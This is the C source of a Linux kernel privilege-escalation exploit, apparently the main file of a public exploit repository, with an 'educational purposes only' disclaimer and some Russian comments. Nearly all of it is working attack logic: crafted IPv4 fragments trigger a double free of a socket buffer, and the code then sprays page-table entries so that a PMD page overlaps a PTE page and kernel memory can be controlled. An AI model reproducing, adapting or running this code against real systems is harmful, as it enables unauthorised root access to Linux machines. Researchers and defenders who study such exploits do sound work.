// This program, and the other programs and scripts ("programs", "these programs") in this software directory/folder/repository ("repository") are published, developed and distributed for educational/research purposes only. I ("the creator") do not condone any malicious or illegal usage of these programs, as the intend is sharing research and not doing illegal activities with it. I am not legally responsible for anything you do with these programs.

#define _GNU_SOURCE 1
#include <sched.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include <string.h>
#include <fcntl.h>
#include <sys/xattr.h>
#include <errno.h>
#include <netinet/ip.h>
#include <arpa/inet.h>

#include "env.h"
#include "net.h"
#include "nftnl.h"
#include "config.h"

#define _pte_index_to_virt(i) (i << 12)
#define _pmd_index_to_virt(i) (i << 21)
#define _pud_index_to_virt(i) (i << 30)
#define _pgd_index_to_virt(i) (i << 39)
#define PTI_TO_VIRT(pud_index, pmd_index, pte_index, page_index, byte_index) \
	((void*)(_pgd_index_to_virt((unsigned long long)(pud_index)) + _pud_index_to_virt((unsigned long long)(pmd_index)) + \
	_pmd_index_to_virt((unsigned long long)(pte_index)) + _pte_index_to_virt((unsigned long long)(page_index)) + (unsigned long long)(byte_index)))

static char intermed_buf[1 << 19];

static void send_ipv4_ip_hdr_chr(size_t dfsize, struct ip *ip_header, char chr)
{
	memset(intermed_buf, chr, dfsize);
	send_ipv4_ip_hdr(intermed_buf, dfsize, ip_header);
}
// пакет с нагрузкой под double free, как раз содержит \x41, тригер на который мы ставили в фильтре
static void trigger_double_free_hdr(size_t dfsize, struct ip *ip_header)
{
	printf("[*] sending double free buffer packet...\n");
	send_ipv4_ip_hdr_chr(dfsize, ip_header, '\x41');
}

static void alloc_intermed_buf_hdr(size_t dfsize, struct ip *ip_header)
{
	PRINTF_VERBOSE("[*] sending intermediate buffer packet...\n");
	send_ipv4_ip_hdr_chr(dfsize, ip_header, '\x00');
}

//блокировка потока на одном ядре
static void pin_cpu(int cpu_id) {
    cpu_set_t mask;

    CPU_ZERO(&mask); // очищает набор процессоров
    CPU_SET(cpu_id, &mask); // выставить бит отображающий CPU x

    if (sched_setaffinity(0, sizeof(cpu_set_t), &mask) == -1) { //устанавливает и получает процессорную маску соответствия для процесса
        perror("sched_setaffinity");
        exit(1); 
    } 
}


static void set_ipfrag_time(unsigned int seconds)
{
	int fd;
	
	fd = open("/proc/sys/net/ipv4/ipfrag_time", O_WRONLY);
	if (fd < 0) {
		perror("open$ipfrag_time");
		exit(1);
	}

	dprintf(fd, "%u\n", seconds);
	close(fd);
}

static void alloc_ipv4_udp(size_t content_size)
{
	PRINTF_VERBOSE("[*] sending udp packet...\n");
	memset(intermed_buf, '\x00', content_size);
	send_ipv4_udp(intermed_buf, content_size);
}



static void privesc_flh_bypass_no_time()
{
	void *_pmd_area;
	struct ip df_ip_header = {
		.ip_v = 4,
		.ip_hl = 5,
		.ip_tos = 0,
		.ip_len = 0xDEAD,
		.ip_id = 0xDEAD, 
		.ip_off = 0xDEAD,
		.ip_ttl = 128,
		.ip_p = 70,
		.ip_src.s_addr = inet_addr("1.1.1.1"),
		.ip_dst.s_addr = inet_addr("255.255.255.255"),
	};

	printf("[+] running normal privesc\n");

    PRINTF_VERBOSE("[*] doing first useless allocs to setup caching and stuff...\n");

	pin_cpu(0);

	// allocate PUD (and a PMD+PTE) for PMD
	mmap((void*)PTI_TO_VIRT(1, 0, 0, 0, 0), 0x2000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	*(unsigned long long*)PTI_TO_VIRT(1, 0, 0, 0, 0) = 0xDEADBEEF;

	// pre-register sprayed PTEs, with 0x1000 * 2, so 2 PTEs fit inside when overlapping with PMD
	// needs to be minimal since VMA registration costs memory
	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
	{
		void *retv = mmap((void*)PTI_TO_VIRT(2, 0, i, 0, 0), 0x2000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);

		if (retv == MAP_FAILED)
		{
			perror("mmap");
			exit(EXIT_FAILURE);
		}
	}

	// pre-allocate PMDs for sprayed PTEs
	// PTE_SPRAY_AMOUNT / 512 = PMD_SPRAY_AMOUNT: PMD contains 512 PTE children
	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT / 512; i++)
		*(char*)PTI_TO_VIRT(2, i, 0, 0, 0) = 0x41;
			// these use different PTEs but the same PMD
	_pmd_area = mmap((void*)PTI_TO_VIRT(1, 1, 0, 0, 0), 0x400000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);
	
	populate_sockets();

	set_ipfrag_time(1);

	// cause socket/networking-related objects to be allocated
	df_ip_header.ip_id = 0x1336;
	df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 8 + 4000;
	df_ip_header.ip_off = ntohs((8 >> 3) | 0x2000);
	alloc_intermed_buf_hdr(32768 + 8, &df_ip_header);

	set_ipfrag_time(9999);

	printf("[*] waiting for the calm before the storm...\n");
	sleep(CONFIG_SEC_BEFORE_STORM);

	// pop N skbs from skb freelist
	for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
	{
		PRINTF_VERBOSE("[*] reserving udp packets... (%d/%d)\n", i, CONFIG_SKB_SPRAY_AMOUNT);
		alloc_ipv4_udp(1);
	}

	// allocate and free 1 skb from freelist
	df_ip_header.ip_id = 0x1337;
	df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 24;
	df_ip_header.ip_off = ntohs((0 >> 3) | 0x2000);  // wait for other fragments. 8 >> 3 to make it wait or so?
	trigger_double_free_hdr(32768 + 8, &df_ip_header);
	
	// push N skbs to skb freelist
	for (int i=0; i < CONFIG_SKB_SPRAY_AMOUNT; i++)
	{
		PRINTF_VERBOSE("[*] freeing reserved udp packets to mask corrupted packet... (%d/%d)\n", i, CONFIG_SKB_SPRAY_AMOUNT);
		recv_ipv4_udp(1);
	}

	// spray-allocate the PTEs from PCP allocator order-0 list
	printf("[*] spraying %d pte's...\n", CONFIG_PTE_SPRAY_AMOUNT);
	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
		*(char*)PTI_TO_VIRT(2, 0, i, 0, 0) = 0x41;

	PRINTF_VERBOSE("[*] double-freeing skb...\n");

	// cause double-free on skb from earlier
	df_ip_header.ip_id = 0x1337;
	df_ip_header.ip_len = sizeof(struct ip)*2 + 32768 + 24;
	df_ip_header.ip_off = ntohs(((32768 + 8) >> 3) | 0x2000);
	
	// skb1->len gets overwritten by s->random() in set_freepointer(). need to discard queue with tricks circumventing skb1->len
	// causes end == offset in ip_frag_queue(). packet will be empty
	// remains running until after both frees, a.k.a. does not require sleep
	alloc_intermed_buf_hdr(0, &df_ip_header);

	// allocate overlapping PMD page (overlaps with PTE)
	*(unsigned long long*)_pmd_area = 0xCAFEBABE;
}

int main()
{
		// вот эта часть создает примитив для двойного освобождения
		setup_env();
 
		privesc_flh_bypass_no_time();

		// prevent crashes due to invalid pagetables
		sleep(9999);

	return 0;
}